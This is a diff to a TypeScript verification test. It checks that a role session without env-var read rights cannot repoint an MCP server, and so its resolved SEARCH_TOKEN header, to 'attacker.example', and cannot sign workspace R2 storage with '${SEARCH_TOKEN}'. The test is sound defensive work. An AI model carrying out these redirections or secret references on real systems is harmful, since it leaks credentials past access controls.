@@ -12,7 +12,9 @@ import {
  * An MCP server whose header names a stage variable, `"Bearer ${NAME}"`, as the
  * docs say to write it. The sync resolves the ref into the agent, so its run
  * reaches the model instead of failing on the unresolved header. The server
- * itself is unreachable, which only costs the run its tools.
+ * itself is unreachable, which only costs the run its tools. A role session
+ * that may write MCP servers but not read env vars cannot repoint the server
+ * the agent sends that resolved header to.
  */
 export async function mcpHeaderEnv(context: VerifyContext): Promise<void> {
   const client = new BroodsSyncClient({
@@ -89,4 +91,78 @@ export async function mcpHeaderEnv(context: VerifyContext): Promise<void> {
       : status.status === "completed" || status.status === "failed",
     JSON.stringify(status),
   );
+
+  const send = async (
+    method: string,
+    path: string,
+    token: string,
+    body?: Record<string, unknown>,
+  ): Promise<Response> =>
+    await fetch(`${context.edgeUrl}${path}`, {
+      method: method,
+      headers: {
+        Authorization: `Bearer ${token}`,
+        "Content-Type": "application/json",
+      },
+      ...(body ? { body: JSON.stringify(body) } : {}),
+      signal: AbortSignal.timeout(10_000),
+    });
+  const created = await send("POST", "/v1/roles", context.accountSecret, {
+    name: `mcp-writer-${context.runId}`,
+    policy: {
+      version: 1,
+      rules: [
+        {
+          id: "write",
+          effect: "allow",
+          actions: ["mcp:write", "workspaces:write"],
+        },
+      ],
+    },
+  });
+  const { roleId } = (await created.json()) as { roleId: string };
+  const assumed = await send(
+    "POST",
+    "/v1/account/assume-role",
+    context.accountSecret,
+    { roleId: roleId },
+  );
+  const { token } = (await assumed.json()) as { token: string };
+  const repointed = await context.measure(
+    "repoint the mcp server from a role session",
+    (): Promise<Response> =>
+      send("PATCH", `/v1/mcp/${deployed.ids.mcp.search}`, token, {
+        url: "https://attacker.example/mcp",
+      }),
+  );
+  const refusal = await repointed.text();
+  assertStep(
+    "a role that may not read SEARCH_TOKEN cannot repoint the server that receives it",
+    repointed.status === 400 && refusal.includes("SEARCH_TOKEN"),
+    `${repointed.status} ${refusal.slice(0, 200)}`,
+  );
+  // Core signs a workspace's R2 requests with the env vars its storage names.
+  const workspace = await send("POST", "/v1/workspaces", token, {
+    name: `r2-${context.runId}`,
+    config: {
+      storage: {
+        provider: "s3",
+        bucket: "files",
+        prefix: "verify",
+        endpoint: `https://${"a".repeat(32)}.r2.cloudflarestorage.com`,
+        auth: {
+          type: "r2",
+          accessKeyId: "${SEARCH_TOKEN}",
+          secretAccessKey: "${SEARCH_TOKEN}",
+        },
+      },
+    },
+  });
+  const workspaceRefusal = await workspace.text();
+  assertStep(
+    "a role that may not read SEARCH_TOKEN cannot sign workspace storage with it",
+    workspace.status === 400 && workspaceRefusal.includes("SEARCH_TOKEN"),
+    `${workspace.status} ${workspaceRefusal.slice(0, 200)}`,
+  );
+  await send("DELETE", `/v1/roles/${roleId}`, context.accountSecret);
 }
